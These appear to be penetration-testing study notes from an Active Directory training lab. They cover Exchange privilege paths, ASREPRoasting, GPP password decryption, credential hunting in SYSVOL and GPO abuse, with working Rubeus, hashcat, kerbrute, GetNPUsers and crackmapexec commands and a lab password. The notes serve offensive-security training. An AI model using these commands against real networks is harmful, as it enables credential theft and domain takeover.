## Exchange Related Group Membership

- Exchange Windows Permissions: can add DCSync privileges to a user
- Organization Management: domain admins of Exchange

If we compromise an Exchange server, this will lead to Domain Admin privileges. Dumping credentials will produce cleartext passwords.

## PrivExchange
Flaw in Exchange Server PushSubscription
- Relay to LDAP and dump the domain NTDS database. Will take you directly to Domain Admin with any authenticated domain user account.

## Printer Bug

**Enumerating for MS-PRN Printer Bug
```
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## MS14-068
Need domain user credentials and can get domain admin with flaw in Kerberos. Allows a forged PAC to be accepted by the KDC as legitimate.

## Sniffing LDAP Credentials
Change the LDAP IP to that of our attack host and set up a netcat listener on port 389 to gain credentials: https://grimhacker.com/2018/03/09/just-a-printer/

## Enumerating DNS Records
https://github.com/dirkjanm/adidnsdump

**Using adidnsdump
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```

**Viewing the Contents of the records.csv File
```
head records.csv 
```

**Using the -r Option to Resolve Unknown Records
```
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
head records.csv 
```


## Other Misconfigurations

**Password in Description Field
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

**Password not Required
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

**Credentials in SMB shares and SYSVOL Scripts
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

**Discovering an Interesting Script
```
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

**Finding a Password in the Script
```
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```
- Use crackmapexec with --local-auth flag to see if any user has this password

## Group Policy Preference (GPP) Passwords
AES private key: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN

**Decrypting the Password with gpp-decrypt
```
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```
- Manually search SYSVOL or use https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1


**Using CrackMapExec's gpp_autologin Module
```
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```


## ASREPRoasting
- Works if 'Do not require Kerberos pre-authentication' is enabled
- Attacker requests authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller.
- Offline password attack using Hashcat or John the Ripper
- Can be performed with the Rubeus toolkit
- If attacker has GenericWrite or GenericAll permissions, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again.
- Just like Kerberoasting, the success of this attack depends on the account having a weak password.

**Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```
Import-Module .\PowerView.ps1\
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```

**Retrieving the AS-REP Using Kerbrute
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

**Hunting for Users with Kerberos Pre-auth Not Required
```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```


## Group Policy Object (GPO) Abuse
- Adding addition rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

Tools:
- PowerView
- BloodHound
- group3r
- ADRecon
- PingCastle

**Enumerating GPO Names with PowerView
```
Get-DomainGPO |select displayname
```
- Autologon is in use which may mean there is a readable password in a GPO
- Active Directory Certificate Services (AD CS) is present in the domain
- If Group Policy Management Tools is enabled, we can do the following

**Enumerating GPO Names with a Built-In Cmdlet
```
Get-GPO -All | Select DisplayName
```

**Enumerating Domain User GPO Rights
```
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

**Converting GPO GUID to Name
```
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```
- BloodHound shows that Domain Users have several rights over the Disconnect Idle RDP GPO, which could be leveraged for full control of the object
- Select GPO -> Node Info -> Affected Objects -> GPO is applied to OU APPLICATION@INLANEFREIGHT.LOCAL, which contain 4 computer objects

- We can use SharpGPOAbuse (https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate schedule task on one of the host to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar
- CAUTION: be careful with tool because some GPO that apply to an OU with 1000s of computers, you do not want to be local admin on that many hosts.
